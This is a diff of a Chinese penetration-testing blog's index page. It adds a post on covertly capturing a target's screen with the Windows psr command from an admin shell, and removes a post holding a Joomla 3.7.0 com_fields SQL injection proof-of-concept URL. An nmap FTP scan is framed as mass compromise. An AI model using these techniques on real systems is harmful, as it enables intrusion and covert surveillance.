@@ -139,6 +139,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/07/24/PSR-screen/">
+                利用win自带的 PSR 实现免杀截屏
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-07-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/PSR/">PSR</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 PSR 即win自带的”问题步骤记录器”,也就是说它只会捕捉活动窗口,并不是我们想象的各种远控中的那种截屏功能,win + R 输入 “psr” 即可开启<br><img src="/img/win_screen_self.png" alt=""><br></p>
+<p>0x02 当然,实际渗透中,肯定是不能让对方有任何察觉的,所以图形界面的不要,悄悄的干活,我们可以直接在管理员权限的cmdshell下搞,其实,你完全也可以在PS的shell下操作,至于这个shell怎么搞到,随你,注意,虽然是在命令行中,进程列表中还是会被发现,不过,如果你自己会hook,也是可以让它消失的<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;psr <span class="string">/start</span> <span class="string">/gui</span> 0 <span class="string">/output</span> <span class="string">"d:\capturescreen.zip"</span></div><div class="line">C:\&gt;psr <span class="string">/stop</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/win_screen_self_start.png" alt=""><br><br>
+        </div>
+        <a href="/2017/07/24/PSR-screen/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/07/13/tor-change-ip/">
                 如何更隐匿地渗透
             </a>
@@ -584,38 +617,6 @@
 <p>0x02 和ftp相关的一些漏洞检测脚本:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span>	检查目标<span class="selector-tag">ftp</span>是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量<span class="selector-tag">ftp</span>抓鸡</div><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-p</span> 21 <span class="selector-tag">--script</span> <span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/05/18/nmap-script/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/05/18/joomla-3-70-exp-getshell/">
-                Joomla 3.70 com_fields组件sql注入及joomla3.x拿shell
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-05-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/joomla-exp/">joomla exp</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>大致 poc 如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/</span>Joomla_3.<span class="number">7.0</span>-Stable-Full_Package/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(rand(),concat(<span class="number">0x3a</span>,user()))</div></pre></td></tr></table></figure></p>
-<p><img src="/img/joomla 370 poc.png" alt=""><br><br>
-        </div>
-        <a href="/2017/05/18/joomla-3-70-exp-getshell/" class="read-more">Read More</a>
     
 
 </div>
